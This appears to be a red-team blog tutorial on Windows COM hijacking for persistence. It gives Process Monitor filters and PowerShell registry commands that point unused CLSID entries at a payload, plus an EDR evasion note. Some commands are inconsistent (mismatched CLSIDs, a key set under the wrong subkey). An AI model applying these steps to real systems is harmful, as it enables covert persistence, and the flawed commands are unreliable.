---
layout: post
title: COM Hijacking
date: 2023-12-22
categories: [Malware Development, Persistence]
tags: [persistence]     
---

> COM is a system within Windows to enable interaction between software components through the operating system. 
  References to various COM objects are stored in the Registry

- [MITRE](https://attack.mitre.org/techniques/T1546/015/)

We can establish persistence through COM by hijacking a COM object. When the hijacked object is referenced, our payload is executed instead of the original software component. Hijacking COM objects that are in use can lead to broken applications, so we should look for applications that try to reference broken/unused keys.

To achieve this we can use Process Monitor from the SysInternal suite. Apply these filters

- Operation -> is -> RegOpenKey
    
>   RegOpenKey opens the specified registry key. We use this filter because COM objects are stored in the registry

- Result -> is -> NAME NOT FOUND

>   We use this filter because we don't want to hijack COM objects that are in use

- Path -> ends with -> InprocServer32

>   This registry contains a 32-bit in-process server. In this context, that means a DLL that provides services to other applications

- Path -> ends with -> LocalServer32

>   This registry contains the full path to a COM server application. This means that we can specify the path to an executable which we want executed

Now we will be able to see any process activity that meets these criteria. To speed things up, we can open random applications (such as Access, Outlook and so on). We should look for an object that is not referenced very often, as executing the payload every second is not a good idea.

> OPSEC WARNING: EDR solutions have rules that can detect this technique. For [example](https://www.elastic.co/guide/en/security/8.11/component-object-model-hijacking.html)
{: .prompt-warning }

#### Example 1 - InprocServer32

Let's take for example this COM object, with the CLSID `{4590F811-1D3A-11D0-891F-00AA004B2E24}` (The CLSID is an unique identifier for COM class objects)

```
HKLM:\Software\Classes\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\InprocServer32
```

Let's check it's contents

```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\InprocServer32"

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment
```

If we can change the value of `(default)` from `C:\Windows\System32\thumbcache.dll` to our payload, persistence is succesfully established.

```powershell
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Path\To\payload.dll"
```
We also need to change the threading model to support both single threaded and multi-threaded mode.

```powershell
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

After we are done, we should delete the registry entry and DLL.

#### Example 2 - LocalServer32

We will consider an object with the same CLSID

```
HKLM:\Software\Classes\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\LocalServer32
```

Now the contents will be something to the likes of

```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\LocalServer32"

Name                           Property
----                           --------
Localerver32                   (default)      : C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
                               ServerExecutable : "C:\Program Files\Microsoft Office\Office14\EXCEL.EXE"
```

In this case we have to change the value of `(default)` and `ServerExecutable` to our payload, in PE format.

```powershell
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "LocalServer32" -Value "C:\Path\To\payload.exe"
```

```powershell
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ServerExecutable" -Value "C:\Path\To\payload.exe"
```

To clean up, delete the executable and the registry entry.
